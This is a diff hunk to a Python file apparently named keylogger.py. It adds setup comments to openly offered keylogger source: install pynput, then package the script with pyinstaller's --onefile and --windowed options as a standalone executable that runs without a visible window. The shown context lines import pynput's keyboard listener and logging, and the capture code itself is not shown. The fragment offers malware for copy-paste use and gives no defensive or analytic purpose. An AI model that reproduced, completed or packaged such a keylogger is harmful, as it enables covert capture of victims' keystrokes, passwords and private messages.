@@ -1,4 +1,6 @@
 #JustCopyPasteinaPythonFile
+#Please Install pynput 'pip install pynput'
+#You can use pyinstaller to install as an Exe "pip install pyinstaller" then -> pyinstaller --onefile --windowed keylogger.py
 from pynput import keyboard
 import logging
 
